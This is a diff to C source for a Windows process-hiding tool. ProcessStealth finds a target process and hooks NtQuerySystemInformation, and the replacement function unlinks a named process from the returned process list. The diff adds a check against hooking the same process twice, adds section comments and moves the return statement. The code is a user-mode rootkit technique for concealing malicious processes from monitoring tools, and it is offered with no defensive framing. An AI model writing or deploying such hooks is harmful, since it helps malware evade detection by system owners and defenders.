@@ -65,11 +65,21 @@ BOOL ProcessStealth(wchar_t *TargetProcessName, wchar_t *HideProcessName)
 
     DWORD TargetPID = GetProcessIdByImageName(TargetProcessName);
 
+    static DWORD PrevPID = NULL;
+
     if (TargetPID == NULL)
     {
         printf("[-] %S Not found!\n", TargetProcessName);
         return FALSE;
     }
+
+    if (TargetPID == PrevPID)
+    {
+        printf("[-] It was hooked!\n");
+        return FALSE;
+    }
+
+    PrevPID = TargetPID;
 
     PVOID NtQuerySystemInformation = GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQuerySystemInformation");
 
@@ -209,6 +219,7 @@ NTSTATUS NTAPI NewNtQuerySystemInformation(SYSTEM_INFORMATION_CLASS SystemInform
 
         while (TRUE)
         {
+            // ===================wcsicmp===================
             wchar_t s1, s2;
             BOOL ret = TRUE;
 
@@ -220,7 +231,8 @@ NTSTATUS NTAPI NewNtQuerySystemInformation(SYSTEM_INFORMATION_CLASS SystemInform
                 if (ret == FALSE)
                     break;
             }
-
+            // =============================================
+            // ================manipulation=================
             if (ret)
             {
                 if (pCur->NextEntryOffset == 0)
@@ -230,14 +242,17 @@ NTSTATUS NTAPI NewNtQuerySystemInformation(SYSTEM_INFORMATION_CLASS SystemInform
             }
             else
                 pPrev = pCur;
-
+            // =============================================
+            // ==============check last list================
             if (pCur->NextEntryOffset == 0)
                 break;
-
+            // =============================================
+            // ============change next object===============
             pCur = (ULONGLONG)pCur + pCur->NextEntryOffset;
+            // =============================================
         }
-
-        return ntstatus;
     }
+
+    return ntstatus;
 }
 int AtherFunc() {}
